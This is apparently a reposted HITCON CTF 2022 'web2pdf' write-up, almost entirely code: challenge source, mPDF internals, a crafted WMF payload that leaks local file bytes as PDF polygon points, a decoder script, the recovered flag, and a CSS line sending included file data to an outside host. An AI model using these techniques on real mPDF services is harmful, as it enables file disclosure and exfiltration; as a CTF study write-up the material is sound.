# HITCON CTF 2022 web2pdf Writeup

> 原文: https://www.ctfiot.com/81158.html
> ID: 81158


```
FROM php:8-apache

RUN apt update && apt install -y \
 libfreetype6-dev \
 libjpeg62-turbo-dev \
 libpng-dev \
 git \
 libonig-dev \
 && docker-php-ext-configure gd --with-freetype --with-jpeg \
 && docker-php-ext-install -j$(nproc) gd \
 && docker-php-ext-install mbstring

COPY --from=composer/composer /usr/bin/composer /usr/bin/composer
RUN cd /var/www/ && composer require mpdf/mpdf
RUN chmod -R 733 /var/www/vendor/mpdf/mpdf/tmp
```



```
<?php
error_reporting(0);
require_once __DIR__ . '/../vendor/autoload.php';
require_once __DIR__ . '/hcaptcha.php';

if (isset($_GET['source']))
 die(preg_replace('#hitcon{\w+}#', 'h1tc0n{flag}', show_source(__FILE__, true)));

if (isset($_POST['url'])) {
 if (!verify_hcaptcha()) die("Captcha verification failed");
 $url = $_POST['url'];
 if (preg_match("#^https?://#", $url)) {
 $html = file_get_contents($url);
 $mpdf = new \Mpdf\Mpdf();
 $mpdf->WriteHTML($html);
 $mpdf->Output();
 exit;
 } else {
 die('Invalid URL');
 }
}

?>

<!-- snipped - just the HTML webpage stuff -->

<?php /* $FLAG = 'hitcon{redacted}' */ ?>
```



```
<img src="/etc/passwd">
```



```
Fatal error: Uncaught Mpdf\MpdfImageException: Error parsing image file - image type not recognised and/or not supported by GD imagecreate (/etc/passwd)
```



```
public function fetchDataFromPath($path, $originalSrc = null)
{
 /**
 * Prevents insecure PHP object injection through phar:// wrapper
 * @see https://github.com/mpdf/mpdf/issues/949
 * @see https://github.com/mpdf/mpdf/issues/1381
 */
 $wrapperChecker = new StreamWrapperChecker($this->mpdf);

 if ($wrapperChecker->hasBlacklistedStreamWrapper($path)) {
 throw new \Mpdf\Exception\AssetFetchingException('File contains an invalid stream. Only ' . implode(', ', $wrapperChecker->getWhitelistedStreamWrappers()) . ' streams are allowed.');
 }

 if ($originalSrc && $wrapperChecker->hasBlacklistedStreamWrapper($originalSrc)) {
 throw new \Mpdf\Exception\AssetFetchingException('File contains an invalid stream. Only ' . implode(', ', $wrapperChecker->getWhitelistedStreamWrappers()) . ' streams are allowed.');
 }

 $this->mpdf->GetFullPath($path);

 return $this->isPathLocal($path) || ($originalSrc !== null && $this->isPathLocal($originalSrc))
 ? $this->fetchLocalContent($path, $originalSrc)
 : $this->fetchRemoteContent($path);
}
```



```
public function fetchLocalContent($path, $originalSrc)
{
 $data = '';

 if ($originalSrc && $this->mpdf->basepathIsLocal && $check = @fopen($originalSrc, 'rb')) {
 fclose($check);
 $path = $originalSrc;
 $this->logger->debug(sprintf('Fetching content of file "%s" with local basepath', $path), ['context' => LogContext::REMOTE_CONTENT]);

 return $this->contentLoader->load($path);
 }

 if ($path && $check = @fopen($path, 'rb')) {
 fclose($check);
 $this->logger->debug(sprintf('Fetching content of file "%s" with non-local basepath', $path), ['context' => LogContext::REMOTE_CONTENT]);

 return $this->contentLoader->load($path);
 }

 return $data;
}
```



```
<base href="">
```



```
<img src="/">
```



```
if (trim($path) != '' && !(stristr($e, "src=") !== false && substr($path, 0, 4) == 'var:') && substr($path, 0, 1) != '@') {
 $path = htmlspecialchars_decode($path); // mPDF 5.7.4 URLs
 $orig_srcpath = $path;
 $this->GetFullPath($path);
 $regexp = '/ (href|src)="(.*?)"/i';
 $e = preg_replace($regexp, ' \\1="' . $path . '"', $e);
}
```



```
<img src="@/">
```



```
<svg><!--</svg>-->
```



```
case 0x0538: // PolyPolygon
 $coords = unpack('s' . ($size - 3), $parms);
 $numpolygons = $coords[1];
 $adjustment = $numpolygons;
 for ($j = 1; $j <= $numpolygons; $j++) {
 $numpoints = $coords[$j + 1];
 for ($i = $numpoints; $i > 0; $i--) {
 $px = $coords[2 * $i + $adjustment];
 $py = $coords[2 * $i + 1 + $adjustment];
 if ($i == $numpoints) {
 $wmfdata .= $this->_MoveTo($px, $py);
 } else {
 $wmfdata .= $this->_LineTo($px, $py);
 }
 }
 $adjustment += $numpoints * 2;
 }
```



```
n_points = 20 # No. x/y point pairs to include

sz = (n_points * 2 + 6).to_bytes(4, byteorder='little')
n = (n_points).to_bytes(2, byteorder='little')

pay = b"\xd7\xcd\xc6\x9a" + # Magic Bytes
 (b"A" * 36) + # Padding to sufficient lenggth
 # [ 5 bytes size ][ func ][x,y,w,h = 0x7f]
 b"\x05\x00\x00\x00\x0b\x02\x7f\x7f\x7f\x7f" + # Set canvas origin (x/y)
 b"\x05\x00\x00\x00\x0c\x02\x7f\x7f\x7f\x7f" + # Set canvas size (w/h)
 sz + # Size of PolyPolygon message
 b"\x38\x05" + # PolyPolygon Func
 b"\x01\x00" + # 1 polygon
 n + # of N points
 b"AA" # Padding to make payload size multiple of 3
```



```
29744 21324 l
29744 21324 l
29257 21324 l
31050 13154 l
19265 22618 l
30521 18529 l
17734 31332 l
29744 21836 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
16705 31051 l
```



```
from pdfminer.pdfdocument import PDFDocument, PDFNoOutlines, PDFXRefFallback
from pdfminer.pdfparser import PDFParser
from pdfminer.pdftypes import PDFStream, PDFObjRef, resolve1, stream_value

# Load up our PDF file
fp = open("/home/thobson/Downloads/mpdf.pdf", "rb")
doc = PDFDocument(PDFParser(fp), None)

# Polygon point instructions
dstring = ""

# Loop over all the objects in the PDF
for xref in doc.xrefs:
 for objid in xref.get_objids():
 obj = doc.getobj(objid)
 if obj is None:
 continue
 
 # Find a stream which provides "Type", which identifies our vector point data
 if isinstance(obj, PDFStream) and "Type" in obj.attrs:
 # Grab the data ito dstring
 dstring = obj.get_data().decode("ascii")

# Extract coordinates
coords = [line.split(" ") for line in dstring.split("\n") if len(line.strip()) > 0]
coords = [(int(c[1]), int(c[0])) for c in coords if c[-1] in "lm"]

# Flatten the coordinates, and reverse the array - if you look at the PHP code carefully it actually adds the points backwards
dat = [x for c in coords for x in c][::-1]

final_data = b''

# Loop over each coordinate and extract the low and high bytes, adding this to the final data
for byte_pair in dat:
 bb = byte_pair >> 8
 ba = byte_pair & 0xFF

 final_data += bytes([ba, bb])

# Print the final data, less the first 2 `AA` padding bytes
print(final_data[2:].decode("ascii"))
```



```
+------------------------ADw-/form+------------------------AD4
+------------------------ADw-/section+------------------------AD4
+------------------------ADw-/article+------------------------AD4
+------------------------ADw-/main+------------------------AD4
+------------------------ADw-script src+------------------------AD0AIg-https://js.hcaptcha.com/1/api.js+------------------------ACI async defer+------------------------AD4APA-/script+------------------------AD4
+------------------------ADw-/body+------------------------AD4
```



```
+------------------------ADw?php /+------------------------ACo +------------------------ACQ-FLAG +------------------------AD0 'hitcon+------------------------AHs-Parse+------------------------AF8-Document+------------------------AF8-Failed+------------------------AF8-QAQ+------------------------AF8-aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw+------------------------AH0' +-------------------
```



```
img{
 my-cool-property: '@include url(/local/file.css)'
}
```



```
div {
 background-image: 'https://exfil.hexf.me/?data=@include url(/local/file.css)'
}
```
